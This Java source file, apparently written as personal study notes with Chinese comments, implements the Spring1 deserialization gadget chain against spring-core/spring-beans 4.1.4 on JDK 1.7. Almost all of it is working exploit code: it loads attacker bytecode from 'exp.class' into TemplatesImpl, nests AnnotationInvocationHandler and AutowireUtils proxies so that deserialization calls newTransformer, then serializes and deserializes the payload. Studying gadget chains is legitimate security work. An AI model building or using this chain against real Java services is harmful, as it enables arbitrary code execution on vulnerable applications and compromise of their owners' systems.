import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.springframework.beans.factory.ObjectFactory;
import util.Util;

import javax.xml.transform.Templates;
import java.lang.annotation.Target;
import java.lang.reflect.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;

/*
* 构造链:
*SerializableTypeWrapper$MethodInvokeTypeProvider.readObject()
*   SerializableTypeWrapper.TypeProvider(Proxy).getType()
*       AnnotationInvocationHandler.invoke()
*           ReflectionUtils.invokeMethod()
*               AutowireUtils$ObjectFactoryDelegatingInvocationHandler.invoke()
*                   ObjectFactory(Proxy).getObject()
*                       TemplatesImpl.newTransformer()
* */
/*注意:
使用动态代理疯狂套娃，刚开始还不太熟悉动态代理的过程，看得很晕，重新复习了一下动态代理，
才明白构造思路。，
* */
/*依赖版本:
spring-core : 4.1.4.RELEASE
spring-beans : 4.1.4.RELEASE
jdk 1.7
* */
public class Spring1 {
    public static void main(String[] args)throws Exception {
        TemplatesImpl templates=new TemplatesImpl();
        Class templatesClass=templates.getClass();
        Field namefield=templatesClass.getDeclaredField("_name");
        namefield.setAccessible(true);
        namefield.set(templates,"dragonkeep");
        Field bytecodefield=templatesClass.getDeclaredField("_bytecodes");
        bytecodefield.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("exp.class"));
        byte[][] codes={code};
        bytecodefield.set(templates,codes);
        Field tfactoryField=templatesClass.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates,new TransformerFactoryImpl());


        Class<?> annotationInvocationHandlerClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> annotationInvocationHandlerConstructor = annotationInvocationHandlerClass.getDeclaredConstructors()[0];
        annotationInvocationHandlerConstructor.setAccessible(true);

        HashMap<String, Object> map = new HashMap<>();
        map.put("getObject", templates);

        InvocationHandler invocationHandler = (InvocationHandler) annotationInvocationHandlerConstructor.newInstance(Target.class, map);
        ObjectFactory<?> factory = (ObjectFactory<?>) Proxy.newProxyInstance(
                ClassLoader.getSystemClassLoader(), new Class[]{ObjectFactory.class}, invocationHandler);

        Class<?> ObjectFactoryDelegatingInvocationHandlerClass =
                Class.forName("org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler");
        Constructor<?> ObjectFactoryDelegatingInvocationHandlerConstructor =
                ObjectFactoryDelegatingInvocationHandlerClass.getDeclaredConstructors()[0];
        ObjectFactoryDelegatingInvocationHandlerConstructor.setAccessible(true);
        InvocationHandler ObjectFactoryDelegatingInvocationHandlerHandler =
                (InvocationHandler) ObjectFactoryDelegatingInvocationHandlerConstructor.newInstance(factory);

        Type  typeTemplateProxy = (Type) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),
                new Class[]{Type.class, Templates.class}, ObjectFactoryDelegatingInvocationHandlerHandler);
        HashMap <String,Object> map2 = new HashMap<>();
        map2.put("getType",typeTemplateProxy);

        InvocationHandler newInvocationHandler = (InvocationHandler) annotationInvocationHandlerConstructor.newInstance(Target.class, map2);
        Class<?> typeProviderClass = Class.forName("org.springframework.core.SerializableTypeWrapper$TypeProvider");
        Object typeProviderProxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),
                new Class[]{typeProviderClass}, newInvocationHandler);
        Class<?>       clazz2 = Class.forName("org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider");
        Constructor<?> cons   = clazz2.getDeclaredConstructors()[0];
        cons.setAccessible(true);

        Object objects = cons.newInstance(typeProviderProxy, Object.class.getMethod("toString"), 0);
        Field  field   = clazz2.getDeclaredField("methodName");
        field.setAccessible(true);
        field.set(objects, "newTransformer");

        Util.serialize(objects);
        Util.unserialize();
    }
}
